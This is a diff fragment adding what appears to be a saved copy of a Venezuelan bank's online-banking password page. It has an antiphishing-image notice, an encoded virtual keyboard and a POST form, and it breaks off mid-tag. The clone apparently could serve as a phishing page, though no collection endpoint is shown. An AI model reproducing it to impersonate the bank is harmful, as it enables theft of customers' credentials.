+LENC[15]='CS4GP1+yA3c=';
+LENC[16]='pE4Ql8oM8c0=';
+LENC[17]='AQeP7SarKNw=';
+LENC[18]='UOsBuXTFxpQ=';
+
+LENC[19]='GxWKSGoPDPI=';
+LENC[20]='g99BAWW771g=';
+LENC[21]='vKHiMZYdXgc=';
+LENC[22]='YuHzaIt6OnQ=';
+LENC[23]='/5tfb0GARtM=';          
+LENC[24]='S/oq8RTfU+U=';      
+LENC[25]='SgxJ6mh4PgU=';
+
+
+
+TABLE1 ="<table   class=\"teclad\">";
+		//Primera Fila
+		TABLE1 += "<TR>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET0]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET1]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET2]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET3]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET4]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET5]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET6]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET7]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET8]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET9]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "</TR><TR>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET10]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET11]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET12]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET13]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET14]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET15]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET16]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET17]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET18]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "</TR><TR>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET19]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET20]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET21]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET22]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET23]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET24]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET25]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";	
+		TABLE1 += "</TR>";
+		TABLE1 += "</TABLE>";
+		document.getElementById("A_DIV_LETRA").innerHTML= TABLE1;
+
+}
+/**
+* FIN 
+**/
+
+
+
+</script> 
+<link type="text/css" rel="stylesheet" media="screen"></head>
+
+<body topmargin="0" leftmargin="20%" rightmargin="20%" onload="sload()">
+<form method="POST">
+<input type="HIDDEN" name="campo" value="OPASSWORD">
+<input type="HIDDEN" name="FechaPhishingLoad" value="[24/4/2025 Thu Apr 24 2025 10:34:24 GMT-0500 (hora estándar de Colombia)]">
+<input type="HIDDEN" name="FechaPhishingOnload" value="">
+
+
+<div align="left">
+<table border="0" cellspacing="15%" cellpadding="0" width="100%">
+
+  <tbody><tr> 
+    <td align="right" class="titantiph" height="27" valign="center"><b>Verifica que esta sea tu imagen Antiphishing</b></td>
+		<td align="right" class="sectheader" height="27" valign="center"><img src="pw_files/images1.jpg" width="200" height="200" border="0" galleryimg="no"></td>
+	</tr>
+  <tr> 
+    <td align="left" height="10"></td>
+		<td align="left" height="10"></td>
+	</tr>
+  <tr> 
+      <td align="left" class="afiliar" colspan="2"> 
+        <p align="justify">Si la imagen desplegada no corresponde a la que elegiste en<br>el proceso de auto registro, por favor no ingreses tus datos.<br>Asegúrate de ingresar tu usuario correcto y en caso de<br>persistir la incidencia, comunícate a Exterior NEXO Telefónico<br>por el 0212-508-5000.</p>
+      </td></tr> 
+  <tr> 
+    <td align="center" height="10"></td>
+		<td align="center" height="10"></td>
+	</tr> 
+  <tr> 
+    <td align="center" class="afiliar" colspan="2"><b>Si esta es la imagen correcta, por favor ingresa tu clave<b></b></b></td></tr>
+  <tr>
+      <td height="10">
+    </td>
+		<td height="10"></td>
+	</tr>
+    
+  
+</tbody></table>
+
+
+<table cellspacing="0" cellpadding="0" border="0" width="100%">
+  <tbody><tr> 
+  <td width="146">
+  </td>
+    <td align="left" valign="top" width="37%"> 
+      <table border="0" cellpadding="0" cellspacing="0">
+        <tbody><tr> 
+          <td valign="top" align="center" class="manito">
+          <!-- <div id="ALAFN_DIV">
+			<table class="teclad">
+			<TR>
+				<td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('KAYSvI7rNOY=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">Q</a>
+				</td>
+				<td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('dWxOBhzxAwU=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">W</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('XS7inbCUmyY=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">E</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('M+vM+sGEB24=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">R</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('qp37/IPc51c=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">T</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('K2CwY2aoxYI=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">Y</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('6LXNsEO+GQs=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">U</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('d7mSZS3T3cg=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">I</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('EkhlGqIiFs8=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">O</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('Fypb2XoOIP0=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">P</a>
+				</td></TR>
+				<TR><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('WOaTRl2481A=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">A</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('AAIF/GrmK9o=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">S</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('mn4oDqslqDg=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">D</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('kWBIX0nfCo8=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">F</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('S7tAkA1t+w8=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">G</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('CS4GP1+yA3c=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">H</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('pE4Ql8oM8c0=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">J</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('AQeP7SarKNw=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">K</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('UOsBuXTFxpQ=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">L</a>
+				</td></TR>
+				<TR><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('GxWKSGoPDPI=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">Z</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('g99BAWW771g=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">X</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('vKHiMZYdXgc=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">C</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('YuHzaIt6OnQ=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">V</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('/5tfb0GARtM=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">B</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('S/oq8RTfU+U=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">N</a>
+				</td><td class="manito" >
+					<a onMouseUp="JavaScript:anadirLetra('SgxJ6mh4PgU=','0',12);" onMouseOver="return tituloBarra();" onmouseout="return tituloBarra();">M</a>
+				</td>
+			</TR>
+			</TABLE>
+		  </div> -->
+			<div id="N_DIV_LETRA"><table class="teclad"><tbody><tr><td><a onmouseup="JavaScript:anadirLetra('mn4oDqslqDg=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>D<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('kWBIX0nfCo8=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>F<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('CS4GP1+yA3c=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>H<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('AQeP7SarKNw=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>K<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('pE4Ql8oM8c0=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>J<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('WOaTRl2481A=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>A<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('YuHzaIt6OnQ=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>V<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('S/oq8RTfU+U=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>N<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('S7tAkA1t+w8=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>G<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('g99BAWW771g=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>X<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td></tr><tr><td><a onmouseup="JavaScript:anadirLetra('XS7inbCUmyY=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>E<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('SgxJ6mh4PgU=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>M<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('qp37/IPc51c=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>T<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('AAIF/GrmK9o=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>S<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('/5tfb0GARtM=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>B<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('EkhlGqIiFs8=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>O<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('6LXNsEO+GQs=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>U<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a onmouseup="JavaScript:anadirLetra('M+vM+sGEB24=','0',12);" onmouseover="JavaScript:SHOWALETRA();" onmouseout="JavaScript:SHOWNLETRA();" style="padding-top: 0px; padding-bottom: 0px;"><b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-bottom: 0px;" class="niftycorners"><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b>R<b style="margin-left: -2px; margin-right: -2px; background: transparent; margin-top: 0px;" class="niftycorners"><b class="ts2" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b><b class="ts1" style="background-color: transparent; border-color: rgb(255, 255, 255);"></b></b></a></td><td><a 